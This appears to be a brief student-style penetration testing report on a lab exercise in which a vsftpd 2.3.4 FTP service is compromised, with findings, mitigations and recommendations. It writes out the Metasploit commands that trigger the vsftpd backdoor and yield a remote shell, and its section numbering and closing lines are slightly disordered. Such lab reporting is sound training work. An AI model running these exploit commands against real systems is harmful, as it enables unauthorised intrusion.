Network Penetration Testing Report
1. Introduction

This report documents a penetration test performed within a controlled virtual lab using Kali Linux against a vulnerable target machine.

2. Methodology
Reconnaissance:- Host discovery performed using Nmap.
Enumeration:-Service and version detection.
Vulnerability Analysis:-Detection of known vulnerabilities using NSE scripts.
Exploitation :-Exploitation via Metasploit.
Post Exploitation:- System verification and shell interaction.

3. Findings
   
Finding 1: Open FTP Service
Port: 21
Service: vsftpd 2.3.4
Risk Level: Critical
Impact: Remote shell access
Evidence: Screenshot of Nmap scan
Mitigation: Upgrade FTP service

Finding 2: Vulnerable HTTP Service
Port: 80
Risk Level: Medium
Impact: Information disclosure
Mitigation: Patch outdated components

4. Exploitation Evidence:-
Metasploit successfully exploited the vulnerable FTP service.

Commands executed:
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target-ip>
run

Result: Remote shell obtained.

5. Post Exploitation
Verification commands:
whoami
uname -a

Confirmed shell-level access.

6. Packet Analysis
Traffic captured using Wireshark.

Observed:
TCP handshake
FTP traffic
Exploit-triggered packets

7. Recommendations
Update vulnerable services
Restrict unnecessary ports
Implement IDS/IPS
Apply network segmentation

9. Conclusion
The assessment identified exploitable vulnerabilities and demonstrated successful compromise in a controlled environment.

uname -a

Confirmed shell-level access.
